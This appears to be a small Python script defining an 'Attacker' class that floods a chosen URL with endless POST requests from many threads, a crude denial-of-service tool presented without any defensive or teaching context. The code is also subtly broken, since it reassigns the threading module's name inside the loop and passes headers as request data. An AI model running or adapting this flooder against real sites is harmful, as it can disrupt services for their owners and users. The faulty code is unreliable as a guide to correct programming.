import requests as r
import threading as th

class Attacker:
    def __init__(self, Loop: int = 0):
        self.loop = Loop
    
    def post(self, url: str, headers: dict = {}):
        if self.loop == 0:
            r.post(url, headers)
            return 
        else:
            threads = []
            def post_loop():
                while True:
                    r.post(url, headers)

            for thread in range(self.loop):
                th = th.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.loop): ## Starting threads in the threads list
                threads[thread].start()
                
